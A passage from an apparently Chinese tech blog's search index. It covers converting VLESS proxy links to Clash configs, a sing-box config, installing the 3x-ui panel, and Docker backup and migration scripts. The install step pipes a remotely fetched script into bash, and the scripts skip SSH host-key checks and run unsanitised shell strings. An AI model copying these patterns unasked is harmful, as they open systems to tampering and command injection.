\u0026#34;tcp\u0026#34;) } flow = params.get(\u0026#34;flow\u0026#34;, \u0026#34;\u0026#34;) if flow: proxy[\u0026#34;flow\u0026#34;] = flow if proxy[\u0026#34;network\u0026#34;] == \u0026#34;h2\u0026#34;: proxy[\u0026#34;h2-opts\u0026#34;] = { \u0026#34;host\u0026#34;: [params.get(\u0026#34;sni\u0026#34;, \u0026#34;\u0026#34;)], \u0026#34;path\u0026#34;: \u0026#34;/\u0026#34; } return proxy def vless_file_to_config(infile=\u0026#34;vless.txt\u0026#34;, outfile=\u0026#34;config.yaml\u0026#34;): \u0026#34;\u0026#34;\u0026#34;从 txt 文件批量读取 vless 链接并生成 config.yaml\u0026#34;\u0026#34;\u0026#34; config = base_config.copy() proxies = [] names = [] with open(infile, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: urls = [line.strip() for line in f if line.strip()] for url in urls: try: proxy = parse_vless(url) proxies.append(proxy) names.append(proxy[\u0026#34;name\u0026#34;]) except Exception as e: print(f\u0026#34;⚠️ 跳过无效链接: {url} ({e})\u0026#34;) config[\u0026#34;proxies\u0026#34;] = proxies config[\u0026#34;proxy-groups\u0026#34;][0][\u0026#34;proxies\u0026#34;] = names + [\u0026#34;DIRECT\u0026#34;] with open(outfile, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: yaml.dump(config, f, allow_unicode=True, sort_keys=False) print(f\u0026#34;✅ 已生成 {outfile}，共 {len(proxies)} 个节点\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: infile = sys.argv[1] if len(sys.argv) \u0026gt; 1 else \u0026#34;vless.txt\u0026#34; vless_file_to_config(infile) 安装依赖：\npip install pyyaml 准备一个 vless.txt 文件，每行一个 VLESS 链接：\nvless://uuid1@ip1:port?...#节点1 vless://uuid2@ip2:port?...#节点2 vless://uuid3@ip3:port?...#节点3 python vless2clash_file.py vless.txt 得到 config.yaml，包含所有节点。\nping 打开：https://tcp.ping.pe/\n写上 VPS IP 跟端口；内容为 ip:端口，示例：1.1.1.1:443，然后点击 Go；或者直接回车\n如果显示 successful；证明端口能连接；如果显示 failed；那是无法连接上端口。\nsingbox ios { \u0026ldquo;dns\u0026rdquo;: { \u0026ldquo;servers\u0026rdquo;: [ { \u0026ldquo;tag\u0026rdquo;: \u0026ldquo;google\u0026rdquo;, \u0026ldquo;address\u0026rdquo;: \u0026ldquo;tls://8.8.8.8\u0026rdquo; }, { \u0026ldquo;tag\u0026rdquo;: \u0026ldquo;local\u0026rdquo;, \u0026ldquo;address\u0026rdquo;: \u0026ldquo;223.5.5.5\u0026rdquo;, \u0026ldquo;detour\u0026rdquo;: \u0026ldquo;direct\u0026rdquo; } ], \u0026ldquo;rules\u0026rdquo;: [ { \u0026ldquo;outbound\u0026rdquo;: \u0026ldquo;direct\u0026rdquo;, \u0026ldquo;server\u0026rdquo;: \u0026ldquo;local\u0026rdquo; }, { \u0026ldquo;outbound\u0026rdquo;: \u0026ldquo;proxy\u0026rdquo;, \u0026ldquo;server\u0026rdquo;: \u0026ldquo;google\u0026rdquo; } ], \u0026ldquo;strategy\u0026rdquo;: \u0026ldquo;ipv4_only\u0026rdquo; }, \u0026ldquo;inbounds\u0026rdquo;: [ { \u0026ldquo;type\u0026rdquo;: \u0026ldquo;tun\u0026rdquo;, \u0026ldquo;inet4_address\u0026rdquo;: \u0026ldquo;172.19.0.1/30\u0026rdquo;, \u0026ldquo;auto_route\u0026rdquo;: true, \u0026ldquo;stack\u0026rdquo;:\u0026ldquo;mixed\u0026rdquo;, \u0026ldquo;sniff\u0026rdquo;: true } ], \u0026ldquo;outbounds\u0026rdquo;: [ { \u0026ldquo;type\u0026rdquo;: \u0026ldquo;shadowsocks\u0026rdquo;, \u0026ldquo;tag\u0026rdquo;: \u0026ldquo;proxy\u0026rdquo;, \u0026ldquo;server\u0026rdquo;: \u0026ldquo;185.1.0.1\u0026rdquo;, \u0026ldquo;server_port\u0026rdquo;: 110, \u0026ldquo;method\u0026rdquo; :\u0026ldquo;2022-blake3-chacha20-poly1305\u0026rdquo;, \u0026ldquo;password\u0026rdquo;: \u0026ldquo;Aa123123\u0026rdquo;, \u0026ldquo;multiplex\u0026rdquo;: { \u0026ldquo;enabled\u0026rdquo;: true } }, { \u0026ldquo;type\u0026rdquo;: \u0026ldquo;block\u0026rdquo;, \u0026ldquo;tag\u0026rdquo;: \u0026ldquo;block\u0026rdquo; }, { \u0026ldquo;type\u0026rdquo;: \u0026ldquo;dns\u0026rdquo;, \u0026ldquo;tag\u0026rdquo;: \u0026ldquo;dns-out\u0026rdquo; }, { \u0026ldquo;type\u0026rdquo;: \u0026ldquo;direct\u0026rdquo;, \u0026ldquo;tag\u0026rdquo;: \u0026ldquo;direct\u0026rdquo; } ], \u0026ldquo;route\u0026rdquo;: { \u0026ldquo;rules\u0026rdquo;: [ { \u0026ldquo;protocol\u0026rdquo;: \u0026ldquo;dns\u0026rdquo;, \u0026ldquo;outbound\u0026rdquo;: \u0026ldquo;dns-out\u0026rdquo; }, { \u0026ldquo;geosite\u0026rdquo;: \u0026ldquo;cn\u0026rdquo;, \u0026ldquo;outbound\u0026rdquo;: \u0026ldquo;direct\u0026rdquo; }, { \u0026ldquo;geoip\u0026rdquo;: \u0026ldquo;cn\u0026rdquo;, \u0026ldquo;outbound\u0026rdquo;: \u0026ldquo;direct\u0026rdquo; } ], \u0026ldquo;auto_detect_interface\u0026rdquo;: true, \u0026ldquo;final\u0026rdquo;: \u0026ldquo;proxy\u0026rdquo; } }\n","permalink":"https://qfsyso.github.io/posts/3xui-clash/","summary":"3x-ui 准备服务器\n系统推荐：Debian 11+/Ubuntu 20.04+\n确保服务器安全组已放行常用端口（80/443/自定义端口）。\n安装 3x-ui bash \u0026lt;(curl -Ls https://raw.githubusercontent.com/MHSanaei/3x-ui/master/install.sh) 安装过程中会提示：\n设置面板端口（默认 54321）\n设置登录用户名与密码\n启动与管理 # 启动 systemctl start x-ui # 停止 systemctl stop x-ui # 重启 systemctl restart x-ui # 查看状态 systemctl status x-ui 访问面板 在浏览器中打开：\nhttp://服务器IP:面板端口\n输入用户名和密码登录。\nHTTPS 证书配置（推荐） 3x-ui 自带 ACME，可以直接申请免费证书：\n确保域名已经解析到服务器 IP。\n在面板 → 设置 → 证书管理 → 申请证书。\n添加节点用户 登录面板后，可以添加 VLESS、VMess、Trojan 等协议的用户。\n面板会生成二维码和连接信息，方便客户端（比如 v2rayN、Clash）导入。\n常见问题 面板打不开：检查防火墙/安全组是否放行端口。\n证书申请失败：确认域名已解析，且 80/443 端口未被占用。\n更改面板端口：\nx-ui 在交互菜单里修改端口/用户密码。\nsockt5 入站列表","title":"3XUI Clash"},{"content":"Dcoker Bakup 导出时生成 .tar + _config.json，记录容器端口、卷挂载和环境变量。\n导入时自动读取配置文件，本地导入或远程导入都能恢复原容器配置。\n支持本地导入：无需输入服务器信息。\n支持远程导入：传输 .tar 和 .json 到服务器，并在服务器上启动容器。\nCode python3 -m venv myenv source myenv/bin/activate import os import json import subprocess import paramiko def list_containers(): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;ps\u0026#34;, \u0026#34;--format\u0026#34;, \u0026#34;{{.Names}}\u0026#34;], capture_output=True, text=True) containers = result.stdout.strip().split(\u0026#34;\\n\u0026#34;) return containers def inspect_container(name): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;inspect\u0026#34;, name], capture_output=True, text=True) info = json.loads(result.stdout)[0] ports = info[\u0026#39;HostConfig\u0026#39;][\u0026#39;PortBindings\u0026#39;] volumes = info[\u0026#39;Mounts\u0026#39;] envs = info[\u0026#39;Config\u0026#39;][\u0026#39;Env\u0026#39;] return ports, volumes, envs def export_container(name, image_name): subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;commit\u0026#34;, name, image_name], check=True) tar_file = f\u0026#34;{image_name}.tar\u0026#34; subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;save\u0026#34;, \u0026#34;-o\u0026#34;, tar_file, image_name], check=True) return tar_file def save_container_config(name, ports, volumes, envs): config_file = f\u0026#34;{name}_image_config.json\u0026#34; config = {\u0026#34;ports\u0026#34;: ports, \u0026#34;volumes\u0026#34;: volumes, \u0026#34;envs\u0026#34;: envs} with open(config_file, \u0026#34;w\u0026#34;) as f: json.dump(config, f, indent=4) print(f\u0026#34;容器配置已保存为 {config_file}\u0026#34;) return config_file def transfer_file(local_file, target_host, target_user, target_path): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, username=target_user) sftp = ssh.open_sftp() sftp.put(local_file, os.path.join(target_path, os.path.basename(local_file))) sftp.close() ssh.close() def restore_container(tar_file, container_name, ports, volumes, envs, local=True, target_host=None, target_user=None, target_path=None): port_args = \u0026#34; \u0026#34;.join([f\u0026#34;-p {v[0][\u0026#39;HostPort\u0026#39;]}:{k.split(\u0026#39;/\u0026#39;)[0]}\u0026#34; for k,v in ports.items()]) volume_args = \u0026#34; \u0026#34;.join([f\u0026#34;-v {v[\u0026#39;Source\u0026#39;]}:{v[\u0026#39;Destination\u0026#39;]}\u0026#34; for v in volumes]) env_args = \u0026#34; \u0026#34;.join([f\u0026#34;-e {e}\u0026#34; for e in envs]) image_name = tar_file.replace(\u0026#39;.tar\u0026#39;,\u0026#39;\u0026#39;) run_cmd = f\u0026#34;docker run -d --name {container_name} {port_args} {volume_args} {env_args} {image_name}\u0026#34; if local: subprocess.run(f\u0026#34;docker load -i {tar_file}\u0026#34;, shell=True, check=True) subprocess.run(run_cmd, shell=True, check=True) print(f\u0026#34;容器 {container_name} 已在本地启动。\u0026#34;) else: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, username=target_user) ssh.exec_command(f\u0026#34;docker load -i {os.path.join(target_path, os.path.basename(tar_file))}\u0026#34;) ssh.exec_command(run_cmd) ssh.close() print(f\u0026#34;容器 {container_name} 已在远程服务器 {target_host} 启动。\u0026#34;) def export_flow(): containers = list_containers() print(\u0026#34;本地运行容器列表：\u0026#34;) for idx, c in enumerate(containers): print(f\u0026#34;{idx}: {c}\u0026#34;) choice = int(input(\u0026#34;选择要导出的容器编号: \u0026#34;)) container_name = containers[choice] ports, volumes, envs = inspect_container(container_name) print(\u0026#34;导出镜像中...\u0026#34;) tar_file = export_container(container_name, container_name+\u0026#34;_image\u0026#34;) print(f\u0026#34;镜像已导出为 {tar_file}\u0026#34;) config_file = save_container_config(container_name, ports, volumes, envs) do_transfer = input(\u0026#34;是否传输到目标服务器？(y/n): \u0026#34;).strip().lower() if do_transfer == \u0026#39;y\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;) target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;) print(\u0026#34;传输镜像和配置文件中...\u0026#34;) transfer_file(tar_file, target_host, target_user, target_path) transfer_file(config_file, target_host, target_user, target_path) print(\u0026#34;在目标服务器恢复容器...\u0026#34;) restore_container(tar_file, container_name, ports, volumes, envs, local=False, target_host=target_host, target_user=target_user, target_path=target_path) print(\u0026#34;迁移完成！\u0026#34;) else: print(\u0026#34;镜像和配置文件已保存到本地，未传输到服务器。\u0026#34;) def import_flow(): tar_file = input(\u0026#34;输入本地镜像文件路径 (.tar): \u0026#34;).strip() config_file = tar_file.replace(\u0026#39;.tar\u0026#39;, \u0026#39;_config.json\u0026#39;) container_name = input(\u0026#34;输入要恢复的容器名称: \u0026#34;).strip() mode = input(\u0026#34;选择导入模式：1-本地导入 2-远程导入: \u0026#34;).strip() if not os.path.exists(config_file): print(f\u0026#34;配置文件 {config_file} 不存在，无法恢复端口、卷和环境变量！\u0026#34;) ports, volumes, envs = {}, [], [] else: with open(config_file, \u0026#39;r\u0026#39;) as f: cfg = json.load(f) ports, volumes, envs = cfg.get(\u0026#39;ports\u0026#39;, {}), cfg.get(\u0026#39;volumes\u0026#39;, []), cfg.get(\u0026#39;envs\u0026#39;, []) if mode == \u0026#39;1\u0026#39;: restore_container(tar_file, container_name, ports, volumes, envs, local=True) elif mode == \u0026#39;2\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;) target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;).strip() print(\u0026#34;传输镜像和配置文件中...\u0026#34;) transfer_file(tar_file, target_host, target_user, target_path) transfer_file(config_file, target_host, target_user, target_path) restore_container(tar_file, container_name, ports, volumes, envs, local=False, target_host=target_host, target_user=target_user, target_path=target_path) else: print(\u0026#34;无效选择！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;选择操作：\u0026#34;) print(\u0026#34;1: 导出容器到本地镜像\u0026#34;) print(\u0026#34;2: 将本地镜像导入并恢复容器\u0026#34;) choice = input(\u0026#34;输入 1 或 2: \u0026#34;).strip() if choice == \u0026#39;1\u0026#39;: export_flow() elif choice == \u0026#39;2\u0026#39;: import_flow() else: print(\u0026#34;无效选择！\u0026#34;) Batch import os import json import subprocess import paramiko def list_containers(): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;ps\u0026#34;, \u0026#34;--format\u0026#34;, \u0026#34;{{.Names}}\u0026#34;], capture_output=True, text=True) containers = result.stdout.strip().split(\u0026#34;\\n\u0026#34;) return containers def inspect_container(name): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;inspect\u0026#34;, name], capture_output=True, text=True) info = json.loads(result.stdout)[0] ports = info[\u0026#39;HostConfig\u0026#39;][\u0026#39;PortBindings\u0026#39;] volumes = info[\u0026#39;Mounts\u0026#39;] envs = info[\u0026#39;Config\u0026#39;][\u0026#39;Env\u0026#39;] return ports, volumes, envs def export_container(name, image_name): subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;commit\u0026#34;, name, image_name], check=True) tar_file = f\u0026#34;{image_name}.tar\u0026#34; subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;save\u0026#34;, \u0026#34;-o\u0026#34;, tar_file, image_name], check=True) return tar_file def save_container_config(name, ports, volumes, envs): config_file = f\u0026#34;{name}_image_config.json\u0026#34; config = {\u0026#34;ports\u0026#34;: ports, \u0026#34;volumes\u0026#34;: volumes, \u0026#34;envs\u0026#34;: envs} with open(config_file, \u0026#34;w\u0026#34;) as f: json.dump(config, f, indent=4) print(f\u0026#34;容器配置已保存为 {config_file}\u0026#34;) return config_file def transfer_file(local_file, target_host, target_user, target_path): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, username=target_user) sftp = ssh.open_sftp() sftp.put(local_file, os.path.join(target_path, os.path.basename(local_file))) sftp.close() ssh.close() def restore_container(tar_file, container_name, ports, volumes, envs, local=True, target_host=None, target_user=None, target_path=None): port_args = \u0026#34; \u0026#34;.join([f\u0026#34;-p {v[0][\u0026#39;HostPort\u0026#39;]}:{k.split(\u0026#39;/\u0026#39;)[0]}\u0026#34; for k,v in ports.items()]) volume_args = \u0026#34; \u0026#34;.join([f\u0026#34;-v {v[\u0026#39;Source\u0026#39;]}:{v[\u0026#39;Destination\u0026#39;]}\u0026#34; for v in volumes]) env_args = \u0026#34; \u0026#34;.join([f\u0026#34;-e {e}\u0026#34; for e in envs]) # 只保留文件名，防止 invalid reference format image_name = os.path.basename(tar_file).replace(\u0026#39;.tar\u0026#39;,\u0026#39;\u0026#39;) run_cmd = f\u0026#34;docker run -d --name {container_name} {port_args} {volume_args} {env_args} {image_name}\u0026#34; if local: subprocess.run(f\u0026#34;docker load -i {tar_file}\u0026#34;, shell=True, check=True) subprocess.run(run_cmd, shell=True, check=True) print(f\u0026#34;容器 {container_name} 已在本地启动。\u0026#34;) else: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, username=target_user) ssh.exec_command(f\u0026#34;docker load -i {os.path.join(target_path, os.path.basename(tar_file))}\u0026#34;) ssh.exec_command(run_cmd) ssh.close() print(f\u0026#34;容器 {container_name} 已在远程服务器 {target_host} 启动。\u0026#34;) def export_flow(batch=False): containers = list_containers() print(\u0026#34;本地运行容器列表：\u0026#34;) for idx, c in enumerate(containers): print(f\u0026#34;{idx}: {c}\u0026#34;) if batch: choices = input(\u0026#34;输入要导出的容器编号(多个用逗号隔开，例如0,2,3): \u0026#34;) choices = [int(x.strip()) for x in choices.split(\u0026#34;,\u0026#34;)] else: choice = int(input(\u0026#34;选择要导出的容器编号: \u0026#34;)) choices = [choice] exported = [] for idx in choices: container_name = containers[idx] ports, volumes, envs = inspect_container(container_name) print(f\u0026#34;导出容器 {container_name} 中...\u0026#34;) tar_file = export_container(container_name, container_name + \u0026#34;_image\u0026#34;) print(f\u0026#34;镜像已导出为 {tar_file}\u0026#34;) config_file = save_container_config(container_name, ports, volumes, envs) exported.append((tar_file, config_file, container_name, ports, volumes, envs)) do_transfer = input(\u0026#34;是否传输到目标服务器？(y/n): \u0026#34;).strip().lower() if do_transfer == \u0026#39;y\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;) target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;) for tar_file, config_file, container_name, ports, volumes, envs in exported: print(f\u0026#34;传输 {container_name} 镜像和配置文件中...\u0026#34;) transfer_file(tar_file, target_host, target_user, target_path) transfer_file(config_file, target_host, target_user, target_path) print(f\u0026#34;在目标服务器恢复容器 {container_name}...\u0026#34;) restore_container(tar_file, container_name, ports, volumes, envs, local=False, target_host=target_host, target_user=target_user, target_path=target_path) print(\u0026#34;批量迁移完成！\u0026#34;) else: print(\u0026#34;镜像和配置文件已保存到本地，未传输到服务器。\u0026#34;) def import_flow(batch=False): if batch: dir_path = input(\u0026#34;输入包含镜像的目录路径: \u0026#34;).strip() if not os.path.isdir(dir_path): print(\u0026#34;目录不存在！\u0026#34;) return tar_files = [os.path.join(dir_path, f) for f in os.listdir(dir_path) if f.endswith(\u0026#34;.tar\u0026#34;)] if not tar_files: print(\u0026#34;目录中没有 .tar 文件！\u0026#34;) return else: tar_file = input(\u0026#34;输入本地镜像文件路径 (.tar): \u0026#34;).strip() tar_files = [tar_file] mode = input(\u0026#34;选择导入模式：1-本地导入 2-远程导入: \u0026#34;).strip() if mode == \u0026#39;2\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;) target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;).strip() for tar_file in tar_files: config_file = tar_file.replace(\u0026#39;.tar\u0026#39;, \u0026#39;_config.json\u0026#39;) # 自动生成容器名，去掉路径和 _image.tar 后缀 container_name = os.path.basename(tar_file).replace(\u0026#39;_image.tar\u0026#39;,\u0026#39;\u0026#39;) if not os.path.exists(config_file): print(f\u0026#34;配置文件 {config_file} 不存在，无法恢复端口、卷和环境变量！\u0026#34;) ports, volumes, envs = {}, [], [] else: with open(config_file, \u0026#39;r\u0026#39;) as f: cfg = json.load(f) ports, volumes, envs = cfg.get(\u0026#39;ports\u0026#39;, {}), cfg.get(\u0026#39;volumes\u0026#39;, []), cfg.get(\u0026#39;envs\u0026#39;, []) print(f\u0026#34;恢复容器 {container_name} ...\u0026#34;) if mode == \u0026#39;1\u0026#39;: restore_container(tar_file, container_name, ports, volumes, envs, local=True) elif mode == \u0026#39;2\u0026#39;: transfer_file(tar_file, target_host, target_user, target_path) if os.path.exists(config_file): transfer_file(config_file, target_host, target_user, target_path) restore_container(tar_file, container_name, ports, volumes, envs, local=False, target_host=target_host, target_user=target_user, target_path=target_path) print(\u0026#34;批量导入完成！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;选择操作：\u0026#34;) print(\u0026#34;1: 导出容器到本地镜像\u0026#34;) print(\u0026#34;2: 将本地镜像导入并恢复容器\u0026#34;) print(\u0026#34;3: 批量导出容器\u0026#34;) print(\u0026#34;4: 批量导入镜像并恢复容器（目录模式）\u0026#34;) choice = input(\u0026#34;输入操作编号: \u0026#34;).strip() if choice == \u0026#39;1\u0026#39;: export_flow(batch=False) elif choice == \u0026#39;2\u0026#39;: import_flow(batch=False) elif choice == \u0026#39;3\u0026#39;: export_flow(batch=True) elif choice == \u0026#39;4\u0026#39;: import_flow(batch=True) else: print(\u0026#34;无效选择！\u0026#34;) Network Bak import os import json import subprocess import paramiko def list_containers(): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;ps\u0026#34;, \u0026#34;--format\u0026#34;, \u0026#34;{{.Names}}\u0026#34;], capture_output=True, text=True) containers = result.stdout.strip().split(\u0026#34;\\n\u0026#34;) return containers def inspect_container(name): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;inspect\u0026#34;, name], capture_output=True, text=True) info = json.loads(result.stdout)[0] ports = info[\u0026#39;HostConfig\u0026#39;].get(\u0026#39;PortBindings\u0026#39;, {}) volumes = info.get(\u0026#39;Mounts\u0026#39;, []) envs = info[\u0026#39;Config\u0026#39;].get(\u0026#39;Env\u0026#39;, []) networks = {} for net_name, net_info in info[\u0026#39;NetworkSettings\u0026#39;][\u0026#39;Networks\u0026#39;].items(): networks[net_name] = { \u0026#39;Aliases\u0026#39;: net_info.get(\u0026#39;Aliases\u0026#39;, []), \u0026#39;IPAddress\u0026#39;: net_info.get(\u0026#39;IPAddress\u0026#39;) # 可选，Docker 会自动分配 } return ports, volumes, envs, networks def export_container(name, image_name): subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;commit\u0026#34;, name, image_name], check=True) tar_file = f\u0026#34;{image_name}.tar\u0026#34; subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;save\u0026#34;, \u0026#34;-o\u0026#34;, tar_file, image_name], check=True) return tar_file def save_container_config(name, ports, volumes, envs, networks): config_file = f\u0026#34;{name}_image_config.json\u0026#34; config = { \u0026#34;ports\u0026#34;: ports, \u0026#34;volumes\u0026#34;: volumes, \u0026#34;envs\u0026#34;: envs, \u0026#34;networks\u0026#34;: networks } with open(config_file, \u0026#34;w\u0026#34;) as f: json.dump(config, f, indent=4) print(f\u0026#34;容器配置已保存为 {config_file}\u0026#34;) return config_file def transfer_file(local_file, target_host, target_user, target_path): ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, username=target_user) sftp = ssh.open_sftp() sftp.put(local_file, os.path.join(target_path, os.path.basename(local_file))) sftp.close() ssh.close() def restore_container(tar_file, container_name, ports, volumes, envs, networks, local=True, target_host=None, target_user=None, target_path=None): port_args = \u0026#34; \u0026#34;.join([f\u0026#34;-p {v[0][\u0026#39;HostPort\u0026#39;]}:{k.split(\u0026#39;/\u0026#39;)[0]}\u0026#34; for k,v in ports.items()]) volume_args = \u0026#34; \u0026#34;.join([f\u0026#34;-v {v[\u0026#39;Source\u0026#39;]}:{v[\u0026#39;Destination\u0026#39;]}\u0026#34; for v in volumes]) env_args = \u0026#34; \u0026#34;.join([f\u0026#34;-e {e}\u0026#34; for e in envs]) image_name = os.path.basename(tar_file).replace(\u0026#39;.tar\u0026#39;,\u0026#39;\u0026#39;) run_cmd = f\u0026#34;docker run -d --name {container_name} {port_args} {volume_args} {env_args} {image_name}\u0026#34; if local: subprocess.run(f\u0026#34;docker load -i {tar_file}\u0026#34;, shell=True, check=True) subprocess.run(run_cmd, shell=True, check=True) for net_name, net_cfg in networks.items(): subprocess.run(f\u0026#34;docker network inspect {net_name} || docker network create {net_name}\u0026#34;, shell=True) for alias in net_cfg.get(\u0026#39;Aliases\u0026#39;, []): subprocess.run(f\u0026#34;docker network connect --alias {alias} {net_name} {container_name}\u0026#34;, shell=True) print(f\u0026#34;容器 {container_name} 已在本地启动。\u0026#34;) else: ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(target_host, username=target_user) ssh.exec_command(f\u0026#34;docker load -i {os.path.join(target_path, os.path.basename(tar_file))}\u0026#34;) ssh.exec_command(run_cmd) for net_name, net_cfg in networks.items(): ssh.exec_command(f\u0026#34;docker network inspect {net_name} || docker network create {net_name}\u0026#34;) for alias in net_cfg.get(\u0026#39;Aliases\u0026#39;, []): ssh.exec_command(f\u0026#34;docker network connect --alias {alias} {net_name} {container_name}\u0026#34;) ssh.close() print(f\u0026#34;容器 {container_name} 已在远程服务器 {target_host} 启动。\u0026#34;) def export_flow(batch=False): containers = list_containers() print(\u0026#34;本地运行容器列表：\u0026#34;) for idx, c in enumerate(containers): print(f\u0026#34;{idx}: {c}\u0026#34;) if batch: choices = input(\u0026#34;输入要导出的容器编号(多个用逗号隔开，例如0,2,3): \u0026#34;) choices = [int(x.strip()) for x in choices.split(\u0026#34;,\u0026#34;)] else: choice = int(input(\u0026#34;选择要导出的容器编号: \u0026#34;)) choices = [choice] exported = [] for idx in choices: container_name = containers[idx] ports, volumes, envs, networks = inspect_container(container_name) print(f\u0026#34;导出容器 {container_name} 中...\u0026#34;) tar_file = export_container(container_name, container_name + \u0026#34;_image\u0026#34;) print(f\u0026#34;镜像已导出为 {tar_file}\u0026#34;) config_file = save_container_config(container_name, ports, volumes, envs, networks) exported.append((tar_file, config_file, container_name, ports, volumes, envs, networks)) do_transfer = input(\u0026#34;是否传输到目标服务器？(y/n): \u0026#34;).strip().lower() if do_transfer == \u0026#39;y\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;) target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;) for tar_file, config_file, container_name, ports, volumes, envs, networks in exported: print(f\u0026#34;传输 {container_name} 镜像和配置文件中...\u0026#34;) transfer_file(tar_file, target_host, target_user, target_path) transfer_file(config_file, target_host, target_user, target_path) print(f\u0026#34;在目标服务器恢复容器 {container_name}...\u0026#34;) restore_container(tar_file, container_name, ports, volumes, envs, networks, local=False, target_host=target_host, target_user=target_user, target_path=target_path) print(\u0026#34;批量迁移完成！\u0026#34;) else: print(\u0026#34;镜像和配置文件已保存到本地，未传输到服务器。\u0026#34;) def import_flow(batch=False): if batch: dir_path = input(\u0026#34;输入包含镜像的目录路径: \u0026#34;).strip() if not os.path.isdir(dir_path): print(\u0026#34;目录不存在！\u0026#34;) return tar_files = [os.path.join(dir_path, f) for f in os.listdir(dir_path) if f.endswith(\u0026#34;.tar\u0026#34;)] if not tar_files: print(\u0026#34;目录中没有 .tar 文件！\u0026#34;) return else: tar_file = input(\u0026#34;输入本地镜像文件路径 (.tar): \u0026#34;).strip() tar_files = [tar_file] mode = input(\u0026#34;选择导入模式：1-本地导入 2-远程导入: \u0026#34;).strip() if mode == \u0026#39;2\u0026#39;: target_host = input(\u0026#34;目标服务器IP: \u0026#34;) target_user = input(\u0026#34;目标服务器用户名: \u0026#34;) target_path = input(\u0026#34;目标服务器存放路径: \u0026#34;).strip() for tar_file in tar_files: config_file = tar_file.replace(\u0026#39;.tar\u0026#39;, \u0026#39;_config.json\u0026#39;) container_name = os.path.basename(tar_file).replace(\u0026#39;_image.tar\u0026#39;,\u0026#39;\u0026#39;) if not os.path.exists(config_file): print(f\u0026#34;配置文件 {config_file} 不存在，无法恢复端口、卷、环境变量和网络！\u0026#34;) ports, volumes, envs, networks = {}, [], [], {} else: with open(config_file, \u0026#39;r\u0026#39;) as f: cfg = json.load(f) ports, volumes, envs, networks = cfg.get(\u0026#39;ports\u0026#39;, {}), cfg.get(\u0026#39;volumes\u0026#39;, []), cfg.get(\u0026#39;envs\u0026#39;, []), cfg.get(\u0026#39;networks\u0026#39;, {}) print(f\u0026#34;恢复容器 {container_name} ...\u0026#34;) if mode == \u0026#39;1\u0026#39;: restore_container(tar_file, container_name, ports, volumes, envs, networks, local=True) elif mode == \u0026#39;2\u0026#39;: transfer_file(tar_file, target_host, target_user, target_path) if os.path.exists(config_file): transfer_file(config_file, target_host, target_user, target_path) restore_container(tar_file, container_name, ports, volumes, envs, networks, local=False, target_host=target_host, target_user=target_user, target_path=target_path) print(\u0026#34;批量导入完成！\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;选择操作：\u0026#34;) print(\u0026#34;1: 导出容器到本地镜像\u0026#34;) print(\u0026#34;2: 将本地镜像导入并恢复容器\u0026#34;) print(\u0026#34;3: 批量导出容器\u0026#34;) print(\u0026#34;4: 批量导入镜像并恢复容器（目录模式）\u0026#34;) choice = input(\u0026#34;输入操作编号: \u0026#34;).strip() if choice == \u0026#39;1\u0026#39;: export_flow(batch=False) elif choice == \u0026#39;2\u0026#39;: import_flow(batch=False) elif choice == \u0026#39;3\u0026#39;: export_flow(batch=True) elif choice == \u0026#39;4\u0026#39;: import_flow(batch=True) else: print(\u0026#34;无效选择！\u0026#34;) Auth import os import json import subprocess import paramiko from getpass import getpass def list_containers(): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;ps\u0026#34;, \u0026#34;--format\u0026#34;, \u0026#34;{{.Names}}\u0026#34;], capture_output=True, text=True) containers = result.stdout.strip().split(\u0026#34;\\n\u0026#34;) return containers def inspect_container(name): result = subprocess.run([\u0026#34;docker\u0026#34;, \u0026#34;inspect\u0026#34;, name], capture_output=True, text=True) info = json.loads(result.stdout)[0] ports = info[\u0026#39;HostConfig\u0026#39;].get(\u0026#39;PortBindings\u0026#39;, {}) volumes = info.get(\u0026#39;Mounts\u0026#39;, []) envs = info[\u0026#39;Config\u0026#39;].get(\u0026#39;Env\u0026#39;, []) networks = {} for net_name, net_info in 